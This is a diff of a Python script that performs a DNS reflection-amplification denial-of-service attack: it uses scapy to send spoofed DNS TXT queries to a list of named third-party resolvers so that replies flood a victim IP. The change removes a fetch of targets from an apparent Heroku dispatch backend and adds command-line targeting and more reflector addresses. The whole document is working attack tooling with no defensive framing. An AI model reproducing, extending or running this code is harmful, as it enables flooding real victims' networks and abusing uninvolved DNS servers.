@@ -1,36 +1,25 @@
-# dns_amp_spoof.py — Linked with Heroku Dispatch
+# dns_amp_spoof.py — Accepts IP via command-line for multi-target attack
 import random
 import time
-import requests
+import sys
 from scapy.all import IP, UDP, send, DNS, DNSQR
 
 # === CONFIGURATION ===
-BACKEND_URL = "https://keyauthddos-e093a0d5e730.herokuapp.com"
-DURATION = 60  # Attack duration in seconds
+DURATION = 60  # seconds
+
+# Open DNS reflectors
 REFLECTORS = [
-    "8.8.8.8", "1.1.1.1", "9.9.9.9",
-    "208.67.222.222", "77.88.8.8"
+    "45.90.28.0", "185.222.222.222", "89.185.228.10",
+    "193.110.157.123", "185.156.175.61", "185.130.104.181",
+    "81.95.97.154", "185.26.122.222", "37.235.1.174",
+    "89.38.96.160", "176.9.1.117"
 ]
 
-# === AMPLIFIED DNS QUERY BUILDER ===
+# === BUILD DNS QUERY ===
 def build_query():
     return DNS(rd=1, id=random.randint(0, 65535), qd=DNSQR(qname="example.com", qtype="TXT"))
 
-# === FETCH TARGET IP FROM HEROKU ===
-def fetch_target():
-    try:
-        res = requests.get(f"{BACKEND_URL}/dispatch").json()
-        if "ip" in res:
-            print(f"[+] Target acquired: {res['ip']}:{res['port']}")
-            return res["ip"]
-        else:
-            print("[!] No dispatch task available.")
-            return None
-    except Exception as e:
-        print(f"[!] Error fetching dispatch: {e}")
-        return None
-
-# === MAIN ATTACK FUNCTION ===
+# === ATTACK FUNCTION ===
 def launch_amplified_attack(target_ip):
     print(f"[+] Spoofing DNS queries as {target_ip}")
     end_time = time.time() + DURATION
@@ -43,12 +32,11 @@ def launch_amplified_attack(target_ip):
                 packet = ip / udp / dns
                 send(packet, verbose=0)
             except Exception as e:
-                print(f"[!] Packet error: {e}")
+                print(f"[!] Error: {e}")
     print("[+] Amplification complete.")
 
 if __name__ == "__main__":
-    target_ip = fetch_target()
-    if target_ip:
-        launch_amplified_attack(target_ip)
-    else:
-        print("[!] Aborting attack — no valid target.")
+    if len(sys.argv) != 2:
+        print("Usage: python3 dns_amp_spoof.py <target_ip>")
+        sys.exit(1)
+    launch_amplified_attack(sys.argv[1])
